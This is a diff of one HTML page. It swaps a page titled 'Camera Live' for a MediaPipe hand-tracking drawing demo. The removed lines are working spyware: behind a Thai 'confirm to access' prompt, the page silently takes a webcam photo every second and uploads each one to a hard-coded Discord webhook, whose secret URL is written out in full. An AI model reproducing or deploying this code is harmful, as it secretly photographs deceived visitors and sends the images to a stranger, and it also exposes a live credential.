@@ -2,127 +2,116 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Camera Live</title>
+<title>Hand Draw Fixed</title>
 <style>
-body{
-    background:#0f0f0f;
-    color:white;
-    text-align:center;
-    font-family:sans-serif;
-}
-button{
-    margin-top:15px;
-    padding:15px 25px;
-    font-size:18px;
-    border:none;
-    border-radius:12px;
-    background:#00b3ff;
-    color:white;
-}
-video{
-    width:90%;
-    max-width:400px;
-    margin-top:20px;
-    border-radius:12px;
-    display:none;
-}
-img{
-    margin-top:20px;
-    width:90%;
-    max-width:400px;
-    border-radius:12px;
-}
+  body { margin:0; overflow:hidden; background:black; }
+  video, canvas {
+    position:absolute;
+    top:0;
+    left:0;
+  }
 </style>
 </head>
 <body>
 
-<h2>ยืนยันเพื่อเข้าใช้งาน</h2>
-<button onclick="startCam()">ยืนยัน</button>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-<br>
-<video id="cam" autoplay playsinline></video>
-<br>
-
-<button onclick="manualShot()" id="shotBtn" style="display:none;">📸 กดถ่ายรูป</button>
-
-<br>
-<img id="preview">
-
-<canvas id="canvas" style="display:none;"></canvas>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
 
 <script>
-let running = false;
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
 
-// ===== เปิดกล้อง =====
-async function startCam(){
-    try{
-        const stream = await navigator.mediaDevices.getUserMedia({video:true});
-        const video = document.getElementById("cam");
-        video.srcObject = stream;
-        video.style.display="block";
+async function setupCamera() {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  video.srcObject = stream;
 
-        document.getElementById("shotBtn").style.display="inline-block";
+  return new Promise(resolve => {
+    video.onloadedmetadata = () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      resolve();
+    };
+  });
+}
 
-        // เริ่มส่งรูปตลอดเวลา
-        running = true;
-        autoSend();
+setupCamera();
 
-    }catch{
-        alert("ต้องอนุญาตกล้องก่อน");
+const hands = new Hands({
+  locateFile: (file) =>
+    `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+});
+
+hands.setOptions({
+  maxNumHands: 1,
+  modelComplexity: 1,
+  minDetectionConfidence: 0.7,
+  minTrackingConfidence: 0.7
+});
+
+let drawing = false;
+let lastX = 0;
+let lastY = 0;
+
+function isIndexUp(lm) {
+  return lm[8].y < lm[6].y;
+}
+
+function isFist(lm) {
+  return (
+    lm[8].y > lm[6].y &&
+    lm[12].y > lm[10].y &&
+    lm[16].y > lm[14].y &&
+    lm[20].y > lm[18].y
+  );
+}
+
+hands.onResults(results => {
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  if (!results.multiHandLandmarks) return;
+
+  const lm = results.multiHandLandmarks[0];
+  const x = lm[8].x * canvas.width;
+  const y = lm[8].y * canvas.height;
+
+  if (isIndexUp(lm)) {
+    ctx.strokeStyle = "cyan";
+    ctx.lineWidth = 5;
+    ctx.lineCap = "round";
+
+    if (!drawing) {
+      drawing = true;
+      lastX = x;
+      lastY = y;
     }
-}
 
-// ===== ส่งรูปอัตโนมัติ =====
-function autoSend(){
-    if(!running) return;
+    ctx.beginPath();
+    ctx.moveTo(lastX, lastY);
+    ctx.lineTo(x, y);
+    ctx.stroke();
 
-    takePhoto(false); // false = ไม่โชว์หน้าเว็บ
+    lastX = x;
+    lastY = y;
+  }
+  else if (isFist(lm)) {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+  }
+  else {
+    drawing = false;
+  }
+});
 
-    setTimeout(autoSend,1000); 
-    // ปรับความเร็วตรงนี้:
-    // 2000 = ทุก 2 วิ
-    // 1000 = ทุก 1 วิ
-}
+const camera = new Camera(video, {
+  onFrame: async () => {
+    await hands.send({ image: video });
+  }
+});
 
-// ===== กดถ่ายเอง =====
-function manualShot(){
-    takePhoto(true); // true = โชว์รูป
-}
-
-// ===== ถ่าย =====
-function takePhoto(show){
-    const video = document.getElementById("cam");
-    if(video.videoWidth === 0) return;
-
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
-
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video,0,0);
-
-    canvas.toBlob(blob=>{
-        send(blob);
-
-        // ถ้ากดถ่ายเองให้โชว์รูป
-        if(show){
-            const url = URL.createObjectURL(blob);
-            document.getElementById("preview").src = url;
-        }
-
-    },"image/png");
-}
-
-// ===== ส่ง webhook =====
-function send(blob){
-    const form = new FormData();
-    form.append("file",blob,"cam.png");
-
-    fetch("https://discord.com/api/webhooks/1448363204026826752/nkSpnXNfE2VuTUPhwfwdk0S2huvwGMqwL7pCuVeujHYAPBvcj_-EL6cIn-OdD9HCJNFq",{
-        method:"POST",
-        body:form
-    });
-}
+camera.start();
 </script>
 
 </body>
